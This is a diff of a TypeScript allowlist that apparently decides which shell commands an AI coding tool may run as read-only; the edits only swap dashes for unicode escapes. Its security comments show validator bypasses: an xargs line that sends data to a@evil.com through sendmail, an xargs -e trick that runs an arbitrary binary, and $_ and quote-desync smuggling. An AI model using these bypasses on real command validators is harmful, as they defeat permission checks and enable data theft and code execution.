@@ -51,7 +51,7 @@ type CommandConfig = {
 }
 
 // Shared safe flags for fd and fdfind (Debian/Ubuntu package name)
-// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded —
+// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded \u2014
 // they execute arbitrary commands for each search result.
 const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '-h': 'none',
@@ -75,7 +75,7 @@ const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '--fixed-strings': 'none',
   '-a': 'none',
   '--absolute-path': 'none',
-  // SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess (same
+  // SECURITY: -l/--list-details EXCLUDED \u2014 internally executes `ls` as subprocess (same
   // pathway as --exec-batch). PATH hijacking risk if malicious `ls` is on PATH.
   '-L': 'none',
   '--follow': 'none',
@@ -130,30 +130,30 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
   xargs: {
     safeFlags: {
       '-I': '{}',
-      // SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
+      // SECURITY: `-i` and `-e` (lowercase) REMOVED \u2014 both use GNU getopt
       // optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
       // attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
       // flag takes NO arg and `X` becomes the next positional (target command).
       //
-      // `-i` (`i::` — optional replace-str):
+      // `-i` (`i::` \u2014 optional replace-str):
       //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
-      //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET \u2192 break
+      //   validator: -it bundle (both 'none') OK, tail \u2208 SAFE_TARGET \u2192 break
       //   GNU: -i replace-str=t, tail \u2192 /usr/sbin/sendmail \u2192 NETWORK EXFIL
       //
-      // `-e` (`e::` — optional eof-str):
+      // `-e` (`e::` \u2014 optional eof-str):
       //   cat data | xargs -e EOF echo foo
-      //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
+      //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo \u2208 SAFE_TARGET
       //   GNU: -e no attached arg \u2192 no eof-str, 'EOF' is the TARGET COMMAND
       //   \u2192 executes binary named EOF from PATH \u2192 CODE EXEC (malicious repo)
       //
       // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
-      // arg) instead — both validator and xargs agree on argument consumption.
+      // arg) instead \u2014 both validator and xargs agree on argument consumption.
       // `-i`/`-e` are deprecated (GNU: "use -I instead" / "use -E instead").
       '-n': 'number',
       '-P': 'number',
       '-L': 'number',
       '-s': 'number',
-      '-E': 'EOF', // POSIX, MANDATORY separate arg — validator & xargs agree
+      '-E': 'EOF', // POSIX, MANDATORY separate arg \u2014 validator & xargs agree
       '-0': 'none',
       '-t': 'none',
       '-r': 'none',
@@ -657,9 +657,9 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-L': 'number', // Max depth
       // SECURITY: -R REMOVED. tree -R combined with -H (HTML mode) and -L (depth)
       // WRITES 00Tree.html files to every subdirectory at the depth boundary.
-      // From man tree (< 2.1.0): "-R — at each of them execute tree again
+      // From man tree (< 2.1.0): "-R \u2014 at each of them execute tree again
       // adding `-o 00Tree.html` as a new option." The comment "Rerun at max
-      // depth" was misleading — the "rerun" includes a hardcoded -o file write.
+      // depth" was misleading \u2014 the "rerun" includes a hardcoded -o file write.
       // `tree -R -H . -L 2 /path` \u2192 writes /path/<subdir>/00Tree.html for each
       // subdir at depth 2. FILE WRITE, zero permissions.
       '-P': 'string', // Include pattern
@@ -902,7 +902,7 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-u': 'string',
       // OMITTED (writes to disk): -D (device cache file build/update)
     },
-    // Block +m (create mount supplement file) — writes to disk.
+    // Block +m (create mount supplement file) \u2014 writes to disk.
     // +prefix flags are treated as positional args by validateFlags,
     // so we must catch them here. lsof accepts +m<path> (attached path, no space)
     // with both absolute (+m/tmp/evil) and relative (+mfoo, +m.evil) paths.
@@ -983,10 +983,10 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       // Capabilities that modify terminal state or could be harmful.
       // init/reset run iprog (arbitrary code from terminfo) and modify tty settings.
       // rs1/rs2/rs3/is1/is2/is3 are the individual reset/init sequences that
-      // init/reset invoke internally — rs1 sends ESC c (full terminal reset).
+      // init/reset invoke internally \u2014 rs1 sends ESC c (full terminal reset).
       // clear erases scrollback (evidence destruction). mc5/mc5p activate media copy
       // (redirect output to printer device). smcup/rmcup manipulate screen buffer.
-      // pfkey/pfloc/pfx/pfxl program function keys — pfloc executes strings locally.
+      // pfkey/pfloc/pfx/pfxl program function keys \u2014 pfloc executes strings locally.
       // rf is reset file (analogous to if/init_file).
       const DANGEROUS_CAPABILITIES = new Set([
         'init',
@@ -1046,7 +1046,7 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
     },
   },
 
-  // ss — socket statistics (iproute2). Read-only query tool equivalent to netstat.
+  // ss \u2014 socket statistics (iproute2). Read-only query tool equivalent to netstat.
   // SECURITY: -K/--kill (forcibly close sockets) and -D/--diag (dump raw data to file)
   // are deliberately excluded. -F/--filter (read filter from file) also excluded.
   ss: {
@@ -1106,7 +1106,7 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--context': 'none',
       '-z': 'none',
       '--contexts': 'none',
-      // SECURITY: -N/--net EXCLUDED — performs setns(), unshare(), mount(), umount()
+      // SECURITY: -N/--net EXCLUDED \u2014 performs setns(), unshare(), mount(), umount()
       // to switch network namespace. While isolated to forked process, too invasive.
       '-b': 'none',
       '--bpf': 'none',
@@ -1120,17 +1120,17 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--tos': 'none',
       '--cgroup': 'none',
       '--inet-sockopt': 'none',
-      // SECURITY: -K/--kill EXCLUDED — forcibly closes sockets
-      // SECURITY: -D/--diag EXCLUDED — dumps raw TCP data to a file
-      // SECURITY: -F/--filter EXCLUDED — reads filter expressions from a file
+      // SECURITY: -K/--kill EXCLUDED \u2014 forcibly closes sockets
+      // SECURITY: -D/--diag EXCLUDED \u2014 dumps raw TCP data to a file
+      // SECURITY: -F/--filter EXCLUDED \u2014 reads filter expressions from a file
     },
   },
 
-  // fd/fdfind — fast file finder (fd-find). Read-only search tool.
+  // fd/fdfind \u2014 fast file finder (fd-find). Read-only search tool.
   // SECURITY: -x/--exec (execute command per result) and -X/--exec-batch
   // (execute command with all results) are deliberately excluded.
   fd: { safeFlags: { ...FD_SAFE_FLAGS } },
-  // fdfind is the Debian/Ubuntu package name for fd — same binary, same flags
+  // fdfind is the Debian/Ubuntu package name for fd \u2014 same binary, same flags
   fdfind: { safeFlags: { ...FD_SAFE_FLAGS } },
 
   ...PYRIGHT_READ_ONLY_COMMANDS,
@@ -1142,7 +1142,7 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
 const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
   // All gh read-only commands from shared validation map
   ...GH_READ_ONLY_COMMANDS,
-  // aki — Anthropic internal knowledge-base search CLI.
+  // aki \u2014 Anthropic internal knowledge-base search CLI.
   // Network read-only (same policy as gh). --audit-csv omitted: writes to disk.
   aki: {
     safeFlags: {
@@ -1232,7 +1232,7 @@ function getCommandAllowlist(): Record<string, CommandConfig> {
  */
 const SAFE_TARGET_COMMANDS_FOR_XARGS = [
   'echo', // Output only, no dangerous flags
-  'printf', // xargs runs /usr/bin/printf (binary), not bash builtin — no -v support
+  'printf', // xargs runs /usr/bin/printf (binary), not bash builtin \u2014 no -v support
   'wc', // Read-only counting, no dangerous flags
   'grep', // Read-only search, no dangerous flags
   'head', // Read-only, no dangerous flags
@@ -1471,18 +1471,18 @@ const READONLY_COMMANDS = [
   'paste',
   'tr',
   'column',
-  'tac', // Reverse cat — displays file contents in reverse line order
+  'tac', // Reverse cat \u2014 displays file contents in reverse line order
   'rev', // Reverse characters in each line
   'fold', // Wrap lines to specified width
   'expand', // Convert tabs to spaces
   'unexpand', // Convert spaces to tabs
-  'fmt', // Simple text formatter — output to stdout only
+  'fmt', // Simple text formatter \u2014 output to stdout only
   'comm', // Compare sorted files line by line
   'cmp', // Byte-by-byte file comparison
   'numfmt', // Number format conversion
 
   // Path information (additional)
-  'readlink', // Resolve symlinks — displays target of symbolic link
+  'readlink', // Resolve symlinks \u2014 displays target of symbolic link
 
   // File comparison
   'diff',
@@ -1592,7 +1592,7 @@ const READONLY_COMMAND_REGEXES = new Set([
  * token check in isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
  * commands; hand-written regexes like uniq's `\S+` and cd's `"[^"]*"` allow `$`.
  * Matches `$` followed by `[A-Za-z_@*#?!$0-9-]` covering `$VAR`, `$_`, `$@`,
- * `$*`, `$#`, `$?`, `$!`, `$$`, `$-`, `$0`-`$9`. Does NOT match `${` or `$(` —
+ * `$*`, `$#`, `$?`, `$!`, `$$`, `$-`, `$0`-`$9`. Does NOT match `${` or `$(` \u2014
  * those are caught by COMMAND_SUBSTITUTION_PATTERNS in bashSecurity.ts.
  *
  * @param command The command string to check
@@ -1614,12 +1614,12 @@ function containsUnquotedExpansion(command: string): boolean {
     }
 
     // SECURITY: Only treat backslash as escape OUTSIDE single quotes. In bash,
-    // `\` inside `'...'` is LITERAL — it does not escape the next character.
+    // `\` inside `'...'` is LITERAL \u2014 it does not escape the next character.
     // Without this guard, `'\'` desyncs the quote tracker: the `\` sets
     // escaped=true, then the closing `'` is consumed by the escaped-skip
     // instead of toggling inSingleQuote. Parser stays in single-quote
     // mode for the rest of the command, missing ALL subsequent expansions.
-    // Example: `ls '\' *` — bash sees glob `*`, but desynced parser thinks
+    // Example: `ls '\' *` \u2014 bash sees glob `*`, but desynced parser thinks
     // `*` is inside quotes \u2192 returns false (glob NOT detected).
     // Defense-in-depth: hasShellQuoteSingleQuoteBug catches `'\'` patterns
     // before this function is reached, but we fix the tracker anyway for
@@ -1698,7 +1698,7 @@ function isCommandReadOnly(command: string): boolean {
   //
   // Globs: `python *` could expand to `python --help` if such a file exists.
   //
-  // Variables: `uniq --skip-chars=0$_` — bash expands `$_` at runtime to the
+  // Variables: `uniq --skip-chars=0$_` \u2014 bash expands `$_` at runtime to the
   // last arg of the previous command. With IFS word splitting, this smuggles
   // positional args past "flags-only" regexes like uniq's `\S+`. The `$` token
   // check inside isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
